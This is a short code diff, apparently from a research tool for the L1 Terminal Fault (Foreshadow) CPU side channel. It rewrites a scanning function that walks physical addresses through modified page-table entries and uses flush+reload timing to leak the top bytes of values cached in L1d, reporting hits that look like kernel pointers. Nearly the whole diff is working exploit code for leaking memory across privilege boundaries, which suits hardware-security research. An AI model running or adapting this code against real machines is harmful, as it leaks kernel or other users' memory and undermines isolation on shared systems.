@@ -432,16 +432,36 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   ptedit_cleanup();
 }
 
-void find_ffff_values(scan_opts_t scan_opts) {
+void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   initialize_pteditor_lib();
-  full_reload_buffer_t reload_buffer = {0};
+  two_byte_reload_buffer reload_buffer = {0};
   leak_addr_t leak = l1tf_leak_buffer_create();
 
-  void *phys_addrs = l1tf_scan_physical_memory(scan_opts, needle_size, needle, reload_buffer, leak);
-  if (phys_addrs) {
-    printf("Found needle at %p\n", phys_addrs);
-  } else {
-    printf("Did not find the needle in physical memory\n");
+  printf("Scanning L1d cache for values between 0xffff000000000000 and 0xffffffffffffffff");
+  size_t max_runs = 1000;
+  for (size_t run = 1; run < max_runs; ++run) {
+    printf("Run %ld / %ld\n", run, max_runs);
+
+    for (uintptr_t physical_addr = scan_opts.start; physical_addr < scan_opts.end;
+         physical_addr += scan_opts.stride) {
+
+      l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
+      uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
+
+      int attempt = 0;
+      int value;
+
+      do {
+        flush(1, reload_buffer[0xffff]);
+        asm_l1tf_leak_2_highest_bytes((void *)leak_addr, reload_buffer);
+        value = reload(1, reload_buffer[0xffff], THRESHOLD);
+        attempt += 1;
+      } while (value == -1 && attempt < 250);
+
+      if (value != -1) {
+        printf("HIT! Virtual address: 0x%lx\tPhysical address: 0x%lx\n", leak_addr, physical_addr);
+      }
+    }
   }
 
   l1tf_leak_buffer_free(&leak);
